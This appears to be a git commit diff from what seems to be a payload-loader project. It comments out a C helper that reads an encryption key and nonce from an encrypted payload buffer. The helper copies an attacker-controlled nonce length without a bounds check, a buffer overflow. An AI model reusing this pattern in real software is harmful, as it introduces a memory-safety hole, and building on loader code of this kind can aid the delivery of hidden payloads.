bb1d49e699af4239ce5cc432bf020abe913e8acb
z3vxo <callumakroyd06@gmail.com>
2026-09-13 00:44:50 +0800

    fix bugs

--- ldr/includes/utils/utils.h
+++ ldr/includes/utils/utils.h
@@ -1,24 +1,24 @@
 #pragma once
 #include "../../includes/core/core.h"
 
-static inline unsigned char* payload_extract_crypto_info(unsigned char* encPayload, int PayloadSize, int* encSize) {
-    int index = 0;
-
-    memcpy(g_ldr->config->EncryptionKey, encPayload, 32);
-    index += 32;
-
-    DWORD NonceLen;
-    memcpy(&NonceLen, encPayload + index, sizeof(DWORD));
-    index += sizeof(DWORD);
-
-    if (NonceLen > 0) {
-        memcpy(g_ldr->config->Nonce, encPayload + index, NonceLen);
-        index += NonceLen;
-    }
-
-    *encSize = PayloadSize - index;
-    return encPayload + index;
-}
+//static inline unsigned char* payload_extract_crypto_info(unsigned char* encPayload, int PayloadSize, int* encSize) {
+//    int index = 0;
+//
+//    memcpy(g_ldr->config->EncryptionKey, encPayload, 32);
+//    index += 32;
+//
+//    DWORD NonceLen;
+//    memcpy(&NonceLen, encPayload + index, sizeof(DWORD));
+//    index += sizeof(DWORD);
+//
+//    if (NonceLen > 0) {
+//        memcpy(g_ldr->config->Nonce, encPayload + index, NonceLen);
+//        index += NonceLen;
+//    }
+//
+//    *encSize = PayloadSize - index;
+//    return encPayload + index;
+//}
 
 
 
